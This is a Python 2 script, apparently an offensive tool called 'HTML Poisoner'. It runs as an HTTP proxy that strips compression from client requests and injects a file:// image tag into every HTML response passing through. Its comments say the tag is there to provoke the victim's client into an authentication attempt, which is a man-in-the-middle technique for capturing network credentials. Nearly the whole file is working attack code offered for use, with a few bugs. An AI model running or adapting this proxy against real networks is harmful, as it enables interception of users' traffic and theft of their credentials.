#!/usr/bin/env python

HOST = "0.0.0.0"
PORT = 3128
VERBOSE = True
TESTING = True
VERBOSETESTING = False
MAX_CONN = 5
BUFFER_SIZE = 4096

TESTING_FILE_RxRequest = 'HTMLpoisoner.clientreq.raw'
TESTING_FILE_RxResponse = 'HTMLpoisoner.clientres.raw'
TESTING_FILE_TxRequest = 'HTMLpoisoner.serverreq.raw'
TESTING_FILE_TxResponse = 'HTMLpoisoner.serverres.raw'

import socket, sys, re, os
from thread import *

def acceptConnection(connection):
    data = connection.recv(BUFFER_SIZE)
    if TESTING:
        print str(len(data))+" bytes received"
    return str(data)

def cleanup():
    try:  # delete the smb.bin file if it exists - this is used for raw connection testing
        os.remove(TESTING_FILE_RxRequest)
        os.remove(TESTING_FILE_RxResponse)
        os.remove(TESTING_FILE_TxRequest)
        os.remove(TESTING_FILE_TxResponse)
    except:
        pass

def getConnectionString(HeaderOne):
    # Example HeaderOne value:
    # GET http://www.google.com:8080/path/to/resource/index.php?q=example HTTP/1.1
    # the below splits the above into its component parts and creates a dictionary
    # from example should result in: "GET"
    try:
        method = HeaderOne.split(' ')[0]
        if VERBOSETESTING:
            print "Method: " + method
        # from example should result in: "http"
        transport = HeaderOne.split(' ')[1].split('://')[0]
        if VERBOSETESTING:
            print "Transport: " + transport
        # from example should result in: "www.google.com:8080"
        hostAndPort = HeaderOne.split(' ')[1].split('://')[1].split('/', 1)[0]
        if VERBOSETESTING:
            print "Host and Port: " + hostAndPort
        try:
            # from example should result in: "8080" (do this first to trigger the except earlier)
            port = hostAndPort.split(':')[1]
            if VERBOSETESTING:
                print "Port: " + str(port)
            # from example should result in: "www.google.com"
            host = hostAndPort.split(':')[0]
            if VERBOSETESTING:
                print "Host: " + host
        except IndexError:
            # from example should result in: "www.google.com"
            host = HeaderOne.split(' ')[1].split('://')[1].split('/',1)[0]
            if VERBOSETESTING:
                print "Host: " + host
            port = 80
            if VERBOSETESTING:
                print "Port: " + str(port)
        URI = '/' + HeaderOne.split(' ')[1].split('://')[1].split('/',1)[1]
        if VERBOSETESTING:
            print "URI: " +  URI
    except IndexError as ErrMsg:
        print 'RxHeaderOne issue detected: ' + str(ErrMsg)
        sys.exit(2)
    connString = {'method' : method, 'transport' : transport, 'host' : host, 'port' : port, 'URI' : URI}
    return connString

def connectionHandler(RxConnection,RxRequest,RxAddress):
    RxHeaders = getHeaders(RxRequest)
    # if HTTPHeaders is not a dictionary, it probably isn't an HTTP request so send the banner
    if RxHeaders == False:
        sendBanner(RxConnection)
    connectionString = getConnectionString(RxHeaders['Req'])

    TxRequest = weakenRequest(RxRequest)

    # Connect to real web server
    TxSocket = createSocketTx(connectionString)
    # Send data to real web server
    TxSocket.send(TxRequest)

    while True:
        # get data response
        TxResponse = TxSocket.recv(BUFFER_SIZE)

        # if the response exists process it, otherwise don't
        if len(TxResponse) > 0:
            RxResponse = weakenResponse(TxResponse)
            RxConnection.send(RxResponse)
            if VERBOSETESTING:
                print 'Server response sent to proxy client at ' + str(RxAddress)
        else:
            break
    TxSocket.close()

def createSocketTx(connectionString):
    try:
        ServerSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ServerSocket.connect((connectionString['host'], connectionString['port']))
        return ServerSocket
    except socket.error as errMsg:
        print "[!] Failed to connect to server (" + connectionString['transport'] + "://" + connectionString['host'] + ":" + connectionString['port'] + "/" + connectionString['URI'] + ")\n" + str(errMsg)
        return False

def createSocketRx(host, port):
    try:
        ServerSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ServerSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #attempt to avoid socket lock problems
        if VERBOSE:
            print "Socket build complete ("+host+":"+str(port)+")"
    except socket.error as errMsg:
        print "[!] Failed to build socket ("+host+":"+str(port)+")\n" + str(errMsg)
        sys.exit(2)
    try:
        ServerSocket.bind((host, port))
        ServerSocket.listen(MAX_CONN)
        if VERBOSE:
            print "Socket bind complete ("+host+":"+str(port)+")"
    except socket.error as errMsg:
        print "[!] Failed to bind socket ("+host+":"+str(port)+")\n" + str(errMsg)
        sys.exit(2)
    return ServerSocket

def getHeaders(RxRequest):
    #Split out the data section from the headers / preamble
    HTTPData = RxRequest.split("\r\n\r\n", 1)
    #Split each line
    HTTPHeadersList = HTTPData[0].split("\r\n")
    try:
        # First line is the HTTP method and request
        HTTPHeadersDict = {'Req' : HTTPHeadersList[0]}
        #The rest are colon separated headers and can be turned into a dictionary
        headerIndex = 0
        for header in HTTPHeadersList:
            if headerIndex > 0:
                headerParts = header.split(":", 1)
                HTTPHeadersDict[headerParts[0]] = headerParts[1]
            headerIndex += 1
        if VERBOSETESTING:
            print HTTPHeadersDict
        return HTTPHeadersDict
    except IndexError:
        return False

def sendBanner(connection):
    connection.send("The HTML Poisoner at your service ma'am...")
    if TESTING:
        print "Banner sent"

def weakenRequest(RxRequest): #placeholder for future function xxx
    TxRequest = re.sub(r'\r\nAccept-Encoding:.*\r\n', '\r\nAccept-Encoding: none\r\n', RxRequest)
    if VERBOSE and 'Accept-Encoding: none' in TxRequest:
        print '[+] Client request weakened'
    elif VERBOSE:
        print '[!] Client request NOT weakened'
    if VERBOSETESTING:
        print TxRequest
        writeRawData(TxRequest, TESTING_FILE_TxRequest)
    return TxRequest #xxx

def weakenResponse(TxResponse): # Inject HTML tag into response to ellicit resource request (and therefore auth attempt) from client
    RxResponse = TxResponse.replace('</body>', '<img src="file://htmlinject/random.jpg" alt="" /></body>')
    if '<img src="file://htmlinject/random.jpg" alt="" />' in RxResponse:
        if VERBOSE:
            print "[+] HTML poisoning performed"
        RxResponse = re.sub(r'\r\nContent-Length:.*\r\n', '\r\nContent-Length: ' + str(len(str(RxResponse)) + len(str(len(str(RxResponse))))) + '\r\n', RxResponse)
    elif VERBOSETESTING:
        print '[!] No HTML poisoning achieved'
    if TESTING:
        writeRawData(RxResponse, TESTING_FILE_RxResponse)
    #if len(RxResponse) != None:
     #   RxResponse = re.sub(('\r\nContent-Length', len(RxResponse))#xxx
    return RxResponse #xxx

def writeRawData(data, filename):
    if VERBOSETESTING:
        print "Attempting to write raw data to disk ("+filename+") for testing purposes"
    outputFile = open(filename, "ab")
    outputFile.write('\r\n\r\n' + data)
    outputFile.close()

#get the thing up and running
def main():
    if TESTING:
        cleanup() #make sure no previous raw file captures are present
    RxSocket = createSocketRx(HOST, PORT)

    #always try and keep a socket open
    while True:
        RxConnection, RxAddress = RxSocket.accept()
        RxRequest = acceptConnection(RxConnection)
        if TESTING:
            writeRawData(RxRequest, TESTING_FILE_RxRequest)
        if VERBOSETESTING:
            print "Connection from: " + RxAddress[0] + ":" + str(RxAddress[1])
        #when new connections are received, spawn a new thread to handle it
        start_new_thread(connectionHandler, (RxConnection,RxRequest,RxAddress))
        RxSocket.close

if __name__ == '__main__':
    try:
        main()
    #attempt, though don't hold your breath, to shutdown gracefully when told to do so
    except KeyboardInterrupt:
        print 'User signaled exit...'
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)
